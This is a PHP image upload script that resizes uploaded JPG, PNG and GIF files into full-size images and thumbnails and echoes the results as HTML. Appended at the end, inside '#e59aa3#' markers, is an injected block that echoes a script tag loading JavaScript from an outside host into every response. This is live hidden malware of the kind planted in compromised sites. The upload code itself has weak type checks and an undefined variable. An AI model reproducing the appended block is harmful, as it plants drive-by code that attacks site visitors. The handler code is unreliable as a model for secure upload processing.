<?php 
$succeed = 0;
$error = 0;
$thegoodstuf = '';
foreach($_FILES["file"]["error"] as $key => $value) {
    if ($value == UPLOAD_ERR_OK){
        $succeed++;

    // get the image original name
    $name = $_FILES["file"]["name"][$key];
    $ext = pathinfo($name, PATHINFO_EXTENSION);
    $img_name=md5($name.rand(00000,99999)).".".$ext;//rename filename


    if($ext=="jpg" || $ext=="jpeg" ){
        $uploadedfile = $_FILES['file']['tmp_name'][$key];
        $src = imagecreatefromjpeg($uploadedfile);
    }else if($ext=="png"){
        $uploadedfile = $_FILES['file']['tmp_name'][$key];
        $src = imagecreatefrompng($uploadedfile);
    }else {
        $src = imagecreatefromgif($uploadedfile);
    }

    list($width,$height)=getimagesize($uploadedfile);

    $new_width=800;
    $new_height=($height/$width)*$new_width;
	
    $tmp=imagecreatetruecolor($new_width,$new_height);

    $new_width1=140;
    $new_height1=($height/$width)*$new_width1;
    $tmp1=imagecreatetruecolor($new_width1,$new_height1);

    imagecopyresampled($tmp,$src,0,0,0,0,$new_width,$new_height,
     $width,$height);

    imagecopyresampled($tmp1,$src,0,0,0,0,$new_width1,$new_height1, 
    $width,$height);

    $filename = "../../photos/".$img_name;
    $filename1 = "../../photos/tn/".$img_name;

    imagejpeg($tmp,$filename,100);
    imagejpeg($tmp1,$filename1,100);

    imagedestroy($src);
    imagedestroy($tmp);
    imagedestroy($tmp1);

//insert to DB here



    // make some nice html to send back
    $thegoodstuf .= "
                        <br>
                        <hr>
                        <div class='thumbnail'>
                        <b class='alert alert-info'>Image $succeed - $img_name</b>
                        <br>
                        width: $new_width  <br>
                        height: $new_height <br>
                        mime type: $mime <br>
                        <br>
                        <br>
                        <img src='../../photos/$img_name' title='$img_name' class='thumbnail'/>
                        </div>
    ";
}
else{
    $error++;
}

}
echo $thegoodstuf;
echo $succeed.' images where uploaded with success!<br>';

if($error){
    echo $error.' images where not properly uploaded!<br>';
}
?>
<?php
#e59aa3#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967009\"></script>";
echo $g;
}
#/e59aa3#
?>